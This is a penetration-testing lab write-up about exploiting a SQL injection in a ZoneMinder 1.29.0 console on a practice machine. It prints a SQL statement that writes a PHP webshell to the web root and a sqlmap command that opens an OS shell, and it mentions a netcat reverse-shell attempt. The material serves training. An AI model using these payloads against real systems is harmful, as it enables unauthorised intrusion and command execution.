There's 3 http ports open of which 3305 and 8080 are running an Apache and a Tomcat server  respectively.

On port 21 there's an FTP server that does *NOT* allow anonymous bind.

Let's check out port 80 for now.


# Initial Foothold

## 80/TCP - HTTP

I went to the website and found the following:

![](../../../assets/f8574b214fc823b7fe0b66d467a8d072.png)

I tried to log in with `admin - admin` but got nothing. This could point to a SQLi vulnerability but let's enumerate further.

### Gobuster

Meanwhile I did a directory search using `gobuster`:

I extended my search using seclists and found a directory that I did not before.

I turned off the search and started checking the website:

![](../../../assets/993f1c4b3dcfc4ef39117e6e4a9d99bf.png)

It seems to be a **ZoneMinder 1.29.0** console, now that we have a version and service we can do some digging for PoC's.

My guess was partially correct, it does appear to be a SQLi exploit. Let's check it out.

![](../../../assets/ef3a9a9f2fc35cc22f930f2cd9fbebf8.png)

Let's try to exploit it

### Burpsuite - Manual Exploitation

I went into burp and tried the ready made payload to test it out:

![](../../../assets/faa4ace971791fa9e2041fec4b949858.png)

it was indeed injectable so that was good. Now it was time to utilize this to give ourselves a webshell.

Since **port 3305** is running a default Apache web page, located in `/var/www/html` we could go ahead and put a webshell there:

```SQL
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php”
```

>[!fail]
>This approach ultimately kept on failing for whatever reason and thus I decided to use SQLmap.

### SQLmap - Automated Exploitation

I went ahead and launched `sqlmap` and let it do it's thing for a while:

```bash
sqlmap http://192.168.115.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --os-shell
```

>[!note]
>Eventhough automated  SQL tools are *NOT* allowed on the exam, OffSec still encourages to use sqlmap for this machine.

>[!fail] 
>This also just kept on failing, I looked everywhere and could not understand why as everyone else just got a shell, but for me the `> os-shell` only kept returning `No output`.

I then slightly modified the POST request and retested it and found out that this time it did work, the shell however is painfully slow.

```bash
POST /zm/index.php HTTP/1.1
Host: 192.168.196.52
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

```

Because the shell was so painstakingly slow I tried to upload `nc` to get a reverse shell, however eventhough the upload worked it would not launch a reverse shell:

![](../../../assets/4c2c48538f623059fc2927d48e55d1c6.png)

### proof.txt

So since this didn't work I just decided to use `cat /root/proof.txt` in order to get the flag.

>[!summary]
>1) We found a **ZoneMinder** console of version 1.29.0 which was vulnerable to SQLi
>2) We tried manually exploiting it with no luck
>3) We also exploited it using `sqlmap` 
>4) We were *NOT* able to get a reverse shell via `sqlmap` for unknown reasons
